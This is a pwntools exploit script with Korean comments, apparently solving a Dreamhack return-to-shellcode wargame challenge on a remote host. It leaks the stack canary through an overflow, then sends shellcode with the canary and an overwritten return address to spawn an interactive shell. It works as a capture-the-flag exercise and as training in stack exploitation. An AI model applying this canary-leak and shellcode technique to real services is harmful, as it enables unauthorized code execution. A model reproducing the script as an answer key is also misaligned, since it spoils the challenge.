from pwn import *

def slog(n,m): return success(': '.join([n, hex(m)]))   # 스택 프레임 정보를 표시하는 slog함수 선언
p=remote('host3.dreamhack.games', 19384)   # r2s 파일 process
context.arch='amd64'   # amd64 아키텍처

# 스택 프레임 정보 수집
p.recvuntil(b'buf: ')  # 출력에서 buf: 문자열까지 읽어서 반환
buf=int(p.recvline()[:-1], 16)   # buf값에 현재 버퍼값을 읽어서 개행 문자를 자른 정정수로 변환해서 저장
slog('address of buf', buf)   # address of buf: buf 형태로 결합

p.recvuntil(b'$rbp: ') # 출력에서 $rbp: 문자열까지 읽어서 반환
sfp=int(p.recvline().split()[0]) # sfp에 split() 배열의 첫 번째 값을 정수 변환 저장함 
cnry=sfp-8 #버퍼부터 sfp까지의 거리에서 64바이트 sfp에서 ret까지 거리 0x8 빼기기
slog('buf <-> sfp', sfp) # 버퍼에서 sfp까지 거리
slog('buf <-> canary', cnry) # 버퍼에서 카나리까지 거리

# 카나리 릭
pl=b'Q'*(cnry+1)
p.sendafter(b'Input:',pl)
p.recvuntil(pl)
cnry=u64(b'\x00'+p.recvn(7))
slog('canary', cnry)

# 다죽자
sh=asm(shellcraft.sh())
pl=sh.ljust(0x58, b'a')+p64(cnry)+b'B'*0x8+p64(buf)
p.sendlineafter(b'Input:', pl)
p.interactive()